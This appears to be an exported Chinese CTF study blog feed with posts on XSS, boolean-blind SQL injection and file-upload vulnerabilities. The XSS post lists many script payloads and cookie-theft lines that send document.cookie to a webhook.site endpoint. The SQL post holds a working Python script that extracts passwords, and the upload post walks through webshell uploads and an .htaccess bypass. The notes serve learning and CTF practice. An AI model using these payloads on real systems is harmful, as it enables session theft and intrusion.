    <title>XXE-primer</title>
    <url>/posts/67440817/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>XSS-基础篇</title>
    <url>/posts/508713684/</url>
    <content><![CDATA[XSS简介：动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容
XSS的分类：1、反射型(非持久化)​	(1)原理
​	反射型xss又称非持久型xss。发出请求时，此类XSS代码出现在URL中，作为输入提交到服务器端，XSS代码被服务器端解析后传回给浏览器，后解析执行XSS代码。
​	(2)攻击方式
​	攻击者将包含xss代码的恶意链接发送给目标用户。当其他用户访问该链接时，服务器接受该用户的URL中参数的请求并进行处理，后xss代码被服务器发送给其他用户的浏览器，触发xss漏洞
2、存储型(持久化)​	(1)原理
​	存储型XSS，提交的代码会存储在服务器端，其他用户请求该页面时会触发xss漏洞，无需访问攻击者的特定链接。例如：留言板中的XSS，用户提交一条包含XSS代码的留言存储到数据库，其他用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击
​	(2)攻击方式
​	攻击者将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，页面进行解析后响应，最后浏览器解析执行XSS代码，触发xss漏洞
3、DOM-based型
文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。

​	(1)原理
​	DOM型xss其实是一种特殊类型的反射型xss，与反射型类似此类XSS代码出现在URL中，但DOM XSS和反射型XSS的区别在于DOM XSS代码并不需要服务器参与，依靠客户端进行解析。
​	(2)攻击方式
​	与反射型类似，当其他用户访问该链接时，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞
XSS代码插入位置1.插入到HTML注释内容中&lt;!-- &lt;script&gt;  alert(&#x27;XSS&#x27;);&lt;/script&gt;--&gt;

2.插入到HTML标签的属性值中&lt;img src=&quot;image,png&quot; onerror=&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;

注：onerror属性是HTML中&lt;img&gt;标签的一个事件属性，它用于定义当图像加载失败时执行的JavaScript代码。
3.插入到HTML标签的属性名中使用语句
&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

构造闭合，可得到以下内容：
&lt;input type=&quot;text&quot; name=&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;

利用构造闭合的方式将恶意代码插入到某个标签中，将恶意代码插入到了标签中的属性值中，实现XSS攻击
4.插入到HTML标签名中&lt; &lt;script&gt; alert(&#x27;XSS&#x27;) &lt;/script&gt;img src=&quot;/1.png&quot;&gt;

浏览器会将第一个尖括号视为整体标签名的起始符号，而第二个尖括号则是&lt;script&gt; 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现XSS攻击
6.插入到CSS中&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`1`)&#x27;);&quot;&gt;

我们在background-image样式属性中插入了一段JavaScript url（在过去，一些浏览器可能没有严格限制这种用法，允许javascript:伪协议在CSS属性中执行JavaScript代码。），当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码。
7.插入到HTTP响应中先留一个坑，还没看懂这个部分，后面再来填
运行脚本的标签以及对应属性&lt;a&gt; 标签对应属性：
href属性（手动点击）
&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;

onfocus（获取焦点时触发XSS，如:点击）
&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;

onclick（点击时触发XSS）
&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;

onmouseover（鼠标悬停于该元素时触发XSS）
&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;

onmouseout（鼠标移出时触发XSS）。
&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;



&lt;img&gt;标签对应属性：
onerror（加载错误时触发XSS、将src乱输入一个值即可）
&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;

onmouseover（鼠标悬停于该元素时触发XSS）
&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;

onmouseout（鼠标移出时触发XSS）
&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;v

onclick（点击时触发XSS）。
&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;



&lt;iframe&gt;标签HTML 内联框架元素 (&lt;iframe&gt;)
对应属性：
onload（加载完成时触发XSS）
&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;

onmouseover（鼠标悬停于该元素时触发XSS）。
&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;

src属性
&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; //base64解码后为&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;



&lt;audio&gt; 标签&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。
对应属性：
onerror（加载错误时触发XSS）
&lt;audio src=1 onerror=alert(1)&gt;&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;

onfocus（获取焦点时触发XSS，如:点击）
&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;

onmouseover（鼠标悬停于该元素时触发XSS）。
&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;



&lt;video&gt;标签对应属性：
onerror（加载错误时触发XSS）
&lt;video src=x onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;

onmouseover（鼠标悬停于该元素时触发XSS）
&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;

onfocus（获取焦点时触发XSS，如:点击）
&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;

onclick（点击时触发XSS）。
&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;



&lt;svg&gt; 标签对应属性：
onload（加载完成时触发XSS）
&lt;svg onload=javascript:alert(1)&gt;&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;



&lt;button&gt; 标签对应属性：
onclick（点击时触发XSS）
&lt;button onclick=alert(1)&gt;&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;

onfocus（获取焦点时触发XSS，如:点击）
&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;

onmouseover（鼠标悬停于该元素时触发XSS）
&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;

onmouseout（鼠标移出时触发XSS）
&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;

onmouseup（鼠标按钮释放时触发XSS）
&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;

onmousedown（鼠标按钮按下时触发XSS）。
&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;



&lt;div&gt;标签对应属性：
onmouseover（鼠标悬停于该元素时触发XSS）
这个需要借助url编码来实现绕过
原代码：&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;经过url编码：&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;



&lt;object&gt;标签这个需要借助 data 伪协议和 base64 编码来实现绕过
&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;



&lt;script&gt; 标签&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;alert(123)&lt;/script&gt;



&lt;p&gt; 标签对应属性：
onclick（点击时触发XSS）
&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;

onmouseover（鼠标悬停于该元素时触发XSS）
&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;

onmouseout（鼠标移出时触发XSS）
&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;

onmouseup（鼠标按钮释放时触发XSS）。
&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;



&lt;input&gt; 标签对应属性：
onclick（点击时触发XSS）
&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;

onfocus（获取焦点时触发XSS，如:点击）
&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;

onmouseover（鼠标悬停于该元素时触发XSS）
&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;

onkeydown（键盘按键按下时触发XSS）。
&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;

onkeydown（在键盘按键按下并释放一个键时触发XSS）。
&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;



&lt;details&gt;标签对应属性：
ontoggle（切换时触发XSS，如:详情元素展开或收起）。
&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;



&lt;select&gt; 标签对应属性：
onfocus（获取焦点时触发XSS，如:点击）
&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;

onmouseover（鼠标悬停于该元素时触发XSS）
&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;

onclick（点击时触发XSS）。
&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;



&lt;form&gt; 标签对应属性：
onmouseover（鼠标悬停于该元素时触发XSS）
&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;

onmouseout（鼠标移出时触发XSS）
&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;

onmouseup（鼠标按钮释放时触发XSS）。
&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;

action（提交表单时触发）
&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;/form&gt;



&lt;body&gt; 标签对应属性：
onload（加载完成时触发XSS）
&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;



外带COOKIE获取cookie未设置为HttpOnly方法：document.cookie可获得所有的 Cookie，每条 cookie 以分号和空格 分隔 (即， key=value 键值对)。例如：
uid=a378eb5d1c4e12d492e63273f7b68c01%40devS; language=zh; _gat=1



设置为HttpOnly
HttpOnly是包含在Set-Cookie HTTP响应头文件中的附加标志。生成cookie时使用HttpOnly标志有助于降低客户端脚本访问受保护cookie的风险（如果浏览器支持）。
即如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的，此时document.cookie 无效。

方法一：cookie回显页面利用服务器中的cookie回显页面，如：PHPinfo页面
条件：有相关请求页面可以回显出cookie
参考链接：How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation
方法二：TRACE HTTP
HTTP定义了8种标准的请求方法，包括GET、POST、PUT、DELETE、HEAD、OPTIONS、TRACE和CONNECT。其中TRACE用于回显服务器收到的请求。

条件：服务器支持TRACE方式请求
注：现代浏览器不允许从 JS 发送 TRACE 请求，从而避免了这种技术。但是，在特定软件中发现了一些绕过此方法的方法，例如发送 \r\nTRACE 而不是 TRACE 发送到 IE6.0 SP2。
方法三： Cookie Jar 溢出参考链接：Cookie Jar Overflow、Cookie Jar Overflow Attack
方法四：表单劫持XSS能插入在登录表单页面，能直接获取登录的账号密码，使用账号密码登录
方法五：浏览器漏洞、中间件漏洞例如：Apache服务器漏洞 CVE-2012-0053
影响版本：2.2.0-2.2.21
攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。
带出cookiefetch()方法全局的 fetch() 方法用于发起获取资源的请求。它返回一个 promise，这个 promise 会在请求响应后被 resolve，并传回 Response对象。例如：
fetch(&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie)

详细参考：fetch() - Web API 接口参考 | MDN (mozilla.org)
XMLHttpRequest 对象利用 XMLHttpRequest 对象发送 HTTP 请求，将 Cookie 数据发送到攻击者的服务器：
&lt;script&gt;var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie, true); xhr.send();&lt;/script&gt;

详细参考：XMLHttpRequest - Web API 接口参考 | MDN (mozilla.org)
window.location 对象 window.location 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如：
&lt;script&gt;window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;&lt;/script&gt;

下面是window.location 对象中可用于跳转的方法：

window.location.href：

window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;


window.location.assign(url)：

window.location.assign(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);


window.location.replace(url)：

window.location.replace(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);



window.open方法window.open() 是 JavaScript 中用于打开新窗口或新标签页的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象。
例如，以下代码将会在新窗口或新标签页中打开指定 URL：
window.open(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);

document.write方法利用 document.write 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口
&lt;script&gt;document.write(`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=$&#123;document.cookie&#125;&quot; &gt;`)&lt;/script&gt;

&lt;script&gt;document.write(&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie+&#x27;&quot;/&gt;&#x27;)&lt;/script&gt;

附：带src属性的标签
**&lt;img&gt;**：
&lt;img src=&quot;image.jpg&quot; alt=&quot;示例图片&quot;&gt;

**&lt;script&gt;**：
&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;

**&lt;iframe&gt;**：
&lt;iframe src=&quot;page.html&quot;&gt;&lt;/iframe&gt;

&lt;video&gt; 和 **&lt;audio&gt;**：
&lt;video src=&quot;video.mp4&quot; controls&gt;&lt;/video&gt;

&lt;audio src=&quot;audio.mp3&quot; controls&gt;&lt;/audio&gt;

&lt;embed&gt; 和 **&lt;object&gt;**：
&lt;embed src=&quot;file.pdf&quot; type=&quot;application/pdf&quot;&gt;

&lt;object data=&quot;file.swf&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;/object&gt;

更多正在学习中…..
jquery-ajax
iCeServer
Superagent
socket
axios

jQuery AJAX

首先确保你的项目中已经包含了jQuery。如果没有，你可以通过添加以下标签来引入：
html
&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;&gt;&lt;/script&gt;

发送请求的示例代码：
javascript
$.ajax(&#123;  url: &#x27;YOUR_ENDPOINT_HERE&#x27;,  method: &#x27;GET&#x27;, // 或者 &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;, 等。  success: function(data) &#123;    console.log(data);  &#125;,  error: function(error) &#123;    console.error(&#x27;Request Failed:&#x27;, error);  &#125;&#125;);


Axios

Axios不是原生支持的，需要引入。你可以通过CDN添加Axios：
html
&lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;

使用Axios发送请求：
javascript
axios.get(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .then(function (response) &#123;    console.log(response.data);  &#125;)  .catch(function (error) &#123;    console.error(&#x27;Request Failed:&#x27;, error);  &#125;);


Superagent

Superagent也需要引入。通过CDN添加Superagent：
html
&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/superagent/6.1.0/superagent.min.js&quot;&gt;&lt;/script&gt;

使用Superagent发送请求：
javascript
superagent  .get(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .end((err, res) =&gt; &#123;    if (err) &#123; return console.error(&#x27;Request Failed:&#x27;, err); &#125;    console.log(res.body);  &#125;);


WebSocket

WebSocket是HTML5的一部分，不需要额外引入。但WebSocket用于实现双向通信，不同于常规的HTTP请求。以下是一个简单的WebSocket示例：
javascript
var socket = new WebSocket(&#x27;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#x27;);socket.onopen = function(event) &#123;  socket.send(&#x27;Hello Server!&#x27;); // 发送数据到服务器&#125;;socket.onmessage = function(event) &#123;  console.log(&#x27;Message from server &#x27;, event.data);&#125;;


Fetch API

Fetch API是现代浏览器原生支持的，不需要引入任何额外的库：
javascript
fetch(&#x27;YOUR_ENDPOINT_HERE&#x27;)  .then(response =&gt; response.json()) // 假设服务器返回的是JSON数据  .then(data =&gt; console.log(data))  .catch(error =&gt; console.error(&#x27;Request Failed:&#x27;, error));

请替换 &#39;YOUR_ENDPOINT_HERE&#39; 和 &#39;wss://YOUR_WEBSOCKET_ENDPOINT_HERE&#39; 为你实际的请求URL或WebSocket端点。每种方法都有其特定的使用场景和优势，选择合适的根据你的项目需求而定。
参考文章
参考先知博主「Sh4d0w」的文章
原文链接：https://xz.aliyun.com/t/12370

参考「hacktricks」学习指南中的文章
原文链接：https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies#httponly


]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP文件包含</title>
    <url>/posts/6864a512/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-布尔盲注</title>
    <url>/posts/1685515616/</url>
    <content><![CDATA[布尔盲注介绍构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息
使用条件：适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false类似的结果（例如：登录成功、）
注意事项：

前面参数在数据库无结果时，拼接语句使用关键词or

前面参数在数据库有结果时，拼接语句使用关键词and
另建议使用脚本


注入使用函数1.substr()/substring()函数
​	substr()/substring()函数：用来截取数据库某个字段中的一部分。
substr(string，start开始位置，length截取长度)  #语法

参数

string：必选，数据库中需要截取的字段
start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。
length：可选，需要截取的长度。缺省。即截取到结束位置

2.ascii()函数
​	ascii()函数：返回字符串str的最左边的数值。
ascii(str)  #语法

3.length() 函数
​	length() 函数，返回字符串的长度
length(str) #语法

4.left() 函数
​	left() 函数，返回从左至右截取固定长度的字符串
left(str,n) #语法 截取字符串str的从左至右前n个字符



注入流程
求当前数据库长度
求当前数据库表的ASCII (即爆出数据库名)
求当前数据库中表的个数
求当前数据库中其中一个表名的长度
求当前数据库中其中一个表名的ASCII
求列名的数量
求列名的长度
求列名的ASCII
求字段的数量
求字段内容的长度
求字段内容对应的ASCII

手工注入过程详解基本模板?id=1&#x27; and (长度/字符函数(所爆数据的SQL) = n) --+

例如：
?id=1&#x27; and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 #



以爆数据库名字为例
求长度?id=1&#x27; and (length(database()) = n) --+

通过页面的回显进行判断，数据库的长度是多少
求数据库名称使用left 函数-- 从左至右截取一个字符SELECT * from users WHERE id = 1 and (left(database(),1)=&#x27;*&#x27;)-- 从左只有截取两个字符SELECT * from users WHERE id = 1 and (left(database(),2)=&#x27;**&#x27;)-- 从左只有截取n个字符SELECT * from users WHERE id = 1 and (left(database(),n)=&#x27;*****&#x27;)

不断修改*中的字符，使之页面显示为true的类似项（如登录成功、成功等）
使用SUBSTR函数-- 截取第1个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = ***)-- 截取第2个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = ***)-- 截取第n个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),n,1)) = ***)

不断修改*中的ASCII码，使之页面显示为true的类似项（如登录成功、成功等）
注入脚本注意查看表单的提交变量名称
使用POST提交数据
import requestschars = &quot;R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&#123;&#125;&quot;result = &quot;&quot;def get_length(value):  # 获取要查询的数据的长度    for n in range(1, 100):        payload = &quot;admin&#x27; and length((&#123;0&#125;)) =&#123;1&#125; #&quot;.format(data_payload, n)        data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;admin&quot;&#125;  //注意查看表单的提交变量名称        html = requests.post(url, data=data)        length = len(html.text)        if length &lt; value:            print(&quot;……data length is :&quot; + str(n))            return ndef get_data(data_length, value):  # 获取数据    global result    for i in range(1, data_length):        for char in chars:            payload = &quot;admin&#x27;and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;.format(data_payload, i, ord(char))            data = &#123;&quot;username&quot;: payload, &quot;password&quot;: &quot;admin&quot;&#125;  //注意查看表单的提交变量名称            html = requests.post(url, data=data)            length = len(html.text)            if length &lt; value:  # 根据返回长度的不同来判断字符正确与否                result += char                print(&quot;…… data is :&quot; + result)                breakurl = &quot;http://***.***.10.67:2081/hard.php&quot;data_payload = &quot;select password from users  limit 0,1&quot; //所爆数据的sql语句value = 550  # 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看length = get_length(value) +1get_data(length, value)print(result)

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞-基础篇</title>
    <url>/posts/416548136/</url>
    <content><![CDATA[施工中
]]></content>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/posts/154257042/</url>
    <content><![CDATA[概述什么是文件上传漏洞文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以向服务器上传恶意文件并进行执行，后获得执行服务端命令的能力。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。
产生文件上传漏洞的原因
不充分的文件验证：如果应用程序未能正确验证上传文件的类型（如MIME类型或文件扩展名）和内容，攻击者可能会上传执行恶意代码的文件。
不安全的文件存储：如果上传的文件存储在可通过Web直接访问的位置，且文件名可预测或未经过适当处理，攻击者可能会执行上传的恶意文件。
未对权限进行限制：权限上没有对于上传的文件目录设置不可执行权限。

例子CTFHUB-技能树-WEB-文件上传-无验证
因为在上传文件后无验证文件信息以及设置动态脚本不可被执行，因此便可直接上传远程木马文件，
 查看图片 
              
              
              
            

上传后访问此网站路径下的/upload/shell.php发现是空白界面，说明php文件可以被执行，此时通过冰蝎进行远程连接
 查看图片教程 
              
              
              
            

出现phpinfo页面，说明连接成功，即可获得主机部分权限，转到对应目录读取flag
 查看图片 
              
              
              
            



后端绕过-解析漏洞
解析漏洞通常指的是当应用程序或服务器在处理上传文件时，由于对文件类型的解析不当或不安全，导致攻击者能够上传恶意文件，从而执行不当操作或获取不当权限的安全问题。例如允许用户上传.htaccess文件导致用户可以设置任意文件格式的解析方式

.htaccess绕过.htaccess简介.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。通过.htaccess可以做到：重写解析规则(如：将png文件作为php来进行解析等)、URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。
.htaccess的作用范围.htaccess的生效范围为.htaccess文件所在的当前目录。
.htaccess利用前提
使用Apache 服务器（ 不适用于Nginx 服务器）
能成功上传.htaccess文件的上传，且没有被重命名

.htaccess使用模板#对于phpAddHandler application/x-httpd-php .html #将html文件作为php文件进行解析

例题：CTFHUB-技能树-WEB-文件上传-.htaccess
查看页面源码可以发现页面后端源码
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;CTFHub 文件上传 - htaccess&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;CTFHub 文件上传 - htaccess&lt;/h1&gt;    &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;        &lt;br /&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--if (!empty($_POST[&#x27;submit&#x27;])) &#123;    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $ext = pathinfo($name)[&#x27;extension&#x27;];    $blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);    if (!in_array($ext, $blacklist)) &#123;        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;            echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;;    &#125;&#125;--&gt;

在 $blacklist = array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);发现大多数的动态执行脚本文件后缀被禁止，但发现.htaccess并没有被禁止，此时可以上传文件.htaccess
AddType application/x-httpd-php .txt

再上传含有shell的php代码的txt文件，上传成功后，访问upload/shell.php.txt，无内容显示，说明.txt文件被作为php脚本执行成功，使用冰蝎连接
 查看图片教程 
              
              
              
            

成功获取phpinfo页面，连接成功，读取flag
.user.ini绕过.user.ini介绍php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini与.htaccess类似，设置当前目录的配置信息。
详细参考信息：
PHP: .user.ini 文件 - Manual、php - 神秘的.user.ini文件
其中php 配置项中有两个配置可以起到文件包含的作用
